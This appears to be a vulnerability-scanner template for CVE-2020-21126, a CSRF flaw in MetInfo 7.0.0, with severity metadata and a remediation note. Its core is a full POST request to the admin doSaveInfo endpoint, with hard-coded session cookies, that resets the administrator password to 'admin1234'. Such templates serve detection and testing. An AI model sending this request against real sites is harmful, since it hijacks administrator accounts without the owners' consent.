id: CVE-2020-21126

info:
  name: CSRF in MetInfo 7.0.0 via admin/?n=admin&c=index&a=doSaveInfo
  author: ProjectDiscoveryAI
  severity: high
  description: MetInfo 7.0.0 contains a Cross-Site Request Forgery (CSRF) vulnerability that allows attackers to update the admin user account without proper authentication.
  impact: |
    Attackers can exploit this vulnerability to perform unauthorized actions on behalf of the user.
  remediation: |
    Implement CSRF protection mechanisms such as unique tokens for each user session.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2020-21126
    cwe-id: CWE-352
    epss-score: 0.00105
    epss-percentile: 0.44476
    cpe: cpe:2.3:a:metinfo:metinfo:7.0.0:-:*:*:*:*:*:*
  metadata:
    vendor: metinfo
    product: metinfo

http:
  - method: POST
    path:
      - "{{BaseURL}}/MetInfo7.0.0/admin/?n=admin&c=index&a=doSaveInfo"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
      Accept: application/json, text/javascript, */*; q=0.01
      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate
      X-Requested-With: XMLHttpRequest
      Content-Type: multipart/form-data; boundary=---------------------------247693219225194
      Connection: close
      Referer: http://localhost/MetInfo7.0.0/admin/
      Cookie: PHPSESSID=01b80466de9751fc3c1cfc72f0950804; Hm_lvt_520556228c0113270c0c772027905838=1575270458; Hm_lpvt_520556228c0113270c0c772027905838=1575270478; re_url=http%3A%2F%2Flocalhost%2FMetInfo7.0.0%2Fadmin%2F; met_auth=6944U4%2BNf5GMXxbjMcP%2FdpXg%2BQxXwKoiip8qdn7r4Y1gU40Kx1SrC79hAb9msm2YHoVx3P0sbF65jOP162y%2FgJxYlA; met_key=hE8G3QZ; admin_lang=cn; page_iframe_url=http%3A%2F%2Flocalhost%2FMetInfo7.0.0%2Findex.php%3Flang%3Dcn%26pageset%3D1; arrlanguage=metinfo

    body: |
      -----------------------------247693219225194
      Content-Disposition: form-data; name="admin_pass"

      admin1234
      -----------------------------247693219225194
      Content-Disposition: form-data; name="admin_pass_replay"

      admin1234
      -----------------------------247693219225194
      Content-Disposition: form-data; name="admin_name"

      test
      -----------------------------247693219225194
      Content-Disposition: form-data; name="admin_mobile"


      -----------------------------247693219225194
      Content-Disposition: form-data; name="admin_email"


      -----------------------------247693219225194
      Content-Disposition: form-data; name="id"

      1
      -----------------------------247693219225194
      Content-Disposition: form-data; name="submit_type"

      save
      -----------------------------247693219225194--
    matchers:
      - type: word
        words:
          - "admin1234"
        part: body
